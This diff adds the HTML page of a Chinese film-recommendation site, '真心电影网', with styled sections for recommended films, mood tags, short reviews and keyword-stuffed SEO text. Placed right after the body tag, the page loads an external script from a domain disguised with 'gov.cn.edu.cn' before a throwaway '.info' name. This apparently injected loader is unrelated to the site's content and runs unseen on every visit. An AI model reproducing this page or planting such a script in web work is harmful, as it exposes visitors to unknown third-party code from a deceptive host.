@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>真心电影网 - 走心高清电影推荐与情感观影平台</title>
+    <meta name="description" content="真心电影网（zhenxindianyingwang-top.github.io）专注推荐最走心、最真诚的高清电影。无论是爱情、亲情还是友情，这里都有触动你内心的好电影。用真心，看好片。">
+    <meta name="keywords" content="真心电影网, 走心电影, 情感电影, 高清电影推荐, 真诚观影, zhenxindianyingwang-top.github.io">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* 基础重置与温情手账风格全局设定 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif; 
+            background-color: #F5EDE0; 
+            /* 模拟纸张纹理 */
+            background-image: radial-gradient(#d4c8b8 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: #4A3F35; 
+            line-height: 1.8; 
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+        }
+        h1, h2, h3, .handwriting { 
+            font-family: 'Comic Sans MS', 'Chalkboard SE', 'Marker Felt', cursive, sans-serif; 
+            font-weight: normal; 
+        }
+        a { text-decoration: none; color: #D96C5B; transition: all 0.3s ease; }
+        a:hover { color: #5B8C7E; }
+        ul { list-style: none; }
+        
+        /* 布局容器 */
+        .container { max-width: 1100px; margin: 0 auto; }
+        
+        /* 头部区域 - 信纸风格 */
+        header { 
+            text-align: center; 
+            padding: 60px 20px; 
+            margin-bottom: 40px;
+            background: #FFFDF9;
+            border: 2px solid #E8DCC9;
+            border-radius: 8px;
+            box-shadow: 4px 4px 0 rgba(0,0,0,0.06);
+            position: relative;
+        }
+        /* 顶部胶带装饰 */
+        header::before {
+            content: '';
+            position: absolute;
+            top: -12px; left: 50%;
+            transform: translateX(-50%) rotate(-2deg);
+            width: 140px; height: 25px;
+            background: rgba(255, 255, 255, 0.6);
+            border: 1px solid #E8DCC9;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        header h1 { 
+            font-size: clamp(2.5rem, 6vw, 4.5rem); 
+            color: #D96C5B; 
+            margin-bottom: 15px; 
+            transform: rotate(-1deg);
+        }
+        header p { 
+            font-size: 1.15rem; 
+            color: #7A6A5E; 
+            max-width: 600px; 
+            margin: 0 auto; 
+            font-weight: 500;
+        }
+        
+        /* 导航栏 - 彩色药丸按钮 */
+        nav { 
+            margin-bottom: 50px; 
+        }
+        nav ul { 
+            display: flex; 
+            justify-content: center; 
+            flex-wrap: wrap; 
+            gap: 20px; 
+        }
+        nav ul li a { 
+            display: block; 
+            background: #5B8C7E; 
+            color: #FFF; 
+            padding: 12px 30px; 
+            border-radius: 30px; 
+            font-weight: bold; 
+            font-size: 1.05rem; 
+            box-shadow: 3px 3px 0 #3A6B5D;
+            transform: rotate(1deg);
+        }
+        nav ul li:nth-child(2) a { background: #E8B04B; box-shadow: 3px 3px 0 #C68A2D; transform: rotate(-1deg); }
+        nav ul li:nth-child(3) a { background: #D96C5B; box-shadow: 3px 3px 0 #B54A3A; transform: rotate(2deg); }
+        nav ul li:nth-child(4) a { background: #7A6A5E; box-shadow: 3px 3px 0 #5A4A3E; transform: rotate(-2deg); }
+        nav ul li a:hover { 
+            transform: translateY(-4px) rotate(0deg); 
+            box-shadow: 5px 5px 0 rgba(0,0,0,0.2);
+        }
+        
+        /* 主体内容 - 不对称网格 */
+        main { 
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            gap: 30px; 
+            margin-bottom: 60px; 
+        }
+        .section { 
+            background: #FFFDF9; 
+            padding: 35px; 
+            border-radius: 8px; 
+            border: 2px solid #E8DCC9;
+            box-shadow: 5px 5px 0 rgba(0,0,0,0.06);
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        .section:nth-child(odd) { transform: rotate(-1deg); }
+        .section:nth-child(even) { transform: rotate(1deg); }
+        .section:hover { 
+            transform: rotate(0deg) translateY(-5px); 
+            box-shadow: 8px 8px 0 rgba(0,0,0,0.1);
+            z-index: 10;
+        }
+        .section-title { 
+            font-size: 1.8rem; 
+            color: #4A3F35; 
+            margin-bottom: 25px; 
+            border-bottom: 3px dashed #E8DCC9; 
+            padding-bottom: 12px;
+        }
+        
+        /* 栏目一：真心推荐 - 便签卡片 */
+        .note-card { 
+            background: #FFF9C4; 
+            padding: 20px 20px 20px 25px; 
+            margin-bottom: 20px; 
+            border-radius: 2px 12px 12px 12px; 
+            box-shadow: 2px 2px 6px rgba(0,0,0,0.08);
+            position: relative;
+            border-left: 4px solid #E8B04B;
+        }
+        .note-card::before {
+            content: '📌';
+            position: absolute;
+            top: -10px; left: -8px;
+            font-size: 1.2rem;
+        }
+        .note-card h3 { font-size: 1.3rem; margin-bottom: 10px; color: #D96C5B; }
+        .note-card p { font-size: 0.95rem; color: #5A4A3E; }
+        .note-card:nth-child(2) { background: #E8F5E9; border-left-color: #5B8C7E; }
+        .note-card:nth-child(2)::before { content: '📍'; }
+        .note-card:nth-child(3) { background: #FFEBEE; border-left-color: #D96C5B; }
+        .note-card:nth-child(3)::before { content: '⭐'; }
+        
+        /* 栏目二：情感片单 - 标签云 */
+        .tag-list { display: flex; flex-wrap: wrap; gap: 15px; }
+        .tag-item { 
+            background: #E8F5E9; 
+            color: #5B8C7E; 
+            padding: 12px 22px; 
+            border-radius: 10px; 
+            font-weight: bold; 
+            border: 2px solid #C8E6C9;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .tag-item:hover { transform: scale(1.05) rotate(-2deg); }
+        .tag-item:nth-child(2) { background: #FFEBEE; color: #D96C5B; border-color: #FFCDD2; }
+        .tag-item:nth-child(3) { background: #E3F2FD; color: #5B8C7E; border-color: #BBDEFB; }
+        .tag-item:nth-child(4) { background: #F3E5F5; color: #7A6A5E; border-color: #E1BEE7; }
+        .tag-item:nth-child(5) { background: #FFF9C4; color: #E8B04B; border-color: #FFF176; }
+        
+        /* 栏目三：观影感悟 - 信笺列表 */
+        .review-item { 
+            background: #FFF; 
+            padding: 22px; 
+            border-left: 5px solid #E8B04B; 
+            margin-bottom: 20px; 
+            box-shadow: 2px 2px 8px rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .review-item::after {
+            content: '❝';
+            position: absolute;
+            top: 10px; right: 15px;
+            font-size: 3rem;
+            color: #F5EDE0;
+            font-family: serif;
+            line-height: 1;
+        }
+        .review-item h3 { font-size: 1.2rem; margin-bottom: 8px; color: #4A3F35; }
+        .review-item p { font-size: 0.95rem; color: #666; font-style: italic; }
+        
+        /* 栏目四：关于本站 - 全宽 */
+        .section-full { 
+            grid-column: 1 / -1; 
+            background: #FFFDF9; 
+            padding: 50px 40px; 
+            text-align: center; 
+            transform: rotate(0deg); 
+            border: 2px dashed #D96C5B;
+        }
+        .section-full h2 { color: #D96C5B; margin-bottom: 20px; }
+        .section-full p { color: #5A4A3E; font-size: 1.1rem; max-width: 700px; margin: 0 auto 20px; }
+        .domain-box { 
+            background: #F5EDE0; 
+            border: 2px dashed #E8B04B; 
+            padding: 20px 30px; 
+            display: inline-block; 
+            margin: 20px 0; 
+            border-radius: 12px;
+            transform: rotate(-1deg);
+        }
+        .domain-box a { 
+            font-family: 'Courier New', Courier, monospace; 
+            font-size: 1.25rem; 
+            font-weight: bold; 
+            color: #D96C5B; 
+            word-break: break-all; 
+        }
+        .domain-box a:hover { color: #5B8C7E; background: transparent; }
+        
+        /* 页脚 */
+        footer { 
+            text-align: center; 
+            padding: 40px 20px; 
+            background: #4A3F35; 
+            color: #F5EDE0; 
+            border-radius: 12px 12px 0 0;
+            margin-top: 40px;
+        }
+        footer p { margin-bottom: 10px; font-size: 0.95rem; }
+        footer .keywords { color: #E8B04B; font-weight: bold; margin-top: 15px; }
+        
+        /* 移动端响应式 */
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            main { grid-template-columns: 1fr; gap: 20px; }
+            .section { transform: none !important; padding: 25px 20px; }
+            .section:hover { transform: none !important; }
+            header h1 { font-size: 2.2rem; }
+            nav ul { gap: 12px; }
+            nav ul li a { padding: 10px 20px; font-size: 0.95rem; }
+            .section-full { padding: 30px 20px; }
+            .domain-box { padding: 15px; }
+            .domain-box a { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="container">
+        <header>
+            <h1>真心电影网</h1>
+            <p>用真心，看每一部好电影。在这里，我们不谈流量，只聊触动。</p>
+        </header>
+        
+        <nav>
+            <ul>
+                <li><a href="#">真心推荐</a></li>
+                <li><a href="#">情感片单</a></li>
+                <li><a href="#">观影感悟</a></li>
+                <li><a href="#">关于本站</a></li>
+            </ul>
+        </nav>
+    </div>
+    
+    <main class="container">
+        <!-- 栏目一：真心推荐 -->
+        <section class="section" id="recommend">
+            <h2 class="section-title">✨ 真心推荐</h2>
+            <div class="note-card">
+                <h3><a href="#">《忠犬八公的故事》</a></h3>
+                <p>一生一次的相遇，一生一世的等待。这部电影会让你相信，世间最纯粹的爱，往往来自不会说话的生命。</p>
+            </div>
+            <div class="note-card">
+                <h3><a href="#">《美丽人生》</a></h3>
+                <p>父亲用谎言编织的游戏，保护了孩子眼中的光芒。在残酷的集中营里，爱是最伟大的谎言，也是最真实的奇迹。</p>
+            </div>
+            <div class="note-card">
+                <h3><a href="#">《海蒂和爷爷》</a></h3>
+                <p>阿尔卑斯山的清风，治愈了所有的不开心。海蒂的纯真提醒我们，真心待人，世界终将温柔以待。</p>
+            </div>
+        </section>
+        
+        <!-- 栏目二：情感片单 -->
+        <section class="section" id="categories">
+            <h2 class="section-title">🎬 情感片单</h2>
+            <div class="tag-list">
+                <a href="#" class="tag-item">💑 爱情真心话</a>
+                <a href="#" class="tag-item">👨‍👩‍👧 亲情无价</a>
+                <a href="#" class="tag-item">🤝 友情万岁</a>
+                <a href="#" class="tag-item">🌱 自我和解</a>
+                <a href="#" class="tag-item">😭 催泪弹</a>
+                <a href="#" class="tag-item">☀️ 治愈系</a>
+            </div>
+        </section>
+        
+        <!-- 栏目三：观影感悟 -->
+        <section class="section" id="reviews">
+            <h2 class="section-title">📝 观影感悟</h2>
+            <div class="review-item">
+                <h3><a href="#">为什么我们总在深夜看文艺片？</a></h3>
+                <p>“白天属于世界，夜晚才属于自己。在那些安静的镜头里，我们终于敢面对真实的脆弱。”</p>
+            </div>
+            <div class="review-item">
+                <h3><a href="#">那些年，被一部电影改变的瞬间</a></h3>
+                <p>“有些电影像一阵风，吹过就忘了；有些电影像一颗种子，在某个不经意的时刻，突然发芽。”</p>
+            </div>
+        </section>
+        
+        <!-- 栏目四：关于本站 -->
+        <section class="section section-full" id="about">
+            <h2>关于真心电影网</h2>
+            <p>欢迎来到<strong>真心电影网</strong>，一个用真诚态度做电影推荐的地方。我们相信，每一部好电影都值得被认真对待，每一位观众都值得被真心对待。</p>
+            <p>在这里，没有冰冷的算法推荐，只有像朋友一样为你精心挑选的片单。</p>
+            <div class="domain-box">
+                <a href="https://zhenxindianyingwang-top.github.io">https://zhenxindianyingwang-top.github.io</a>
+            </div>
+            <p>立即访问我们的官方网站，用真心，遇见好电影。</p>
+        </section>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 真心电影网 (zhenxindianyingwang-top.github.io) 保留所有权利。</p>
+            <p>核心关键词：真心电影网 | 走心电影推荐 | 情感观影指南 | 高清好片分享</p>
+            <p class="keywords">网站域名：zhenxindianyingwang-top.github.io</p>
+        </div>
+    </footer>
+</body>
+</html>
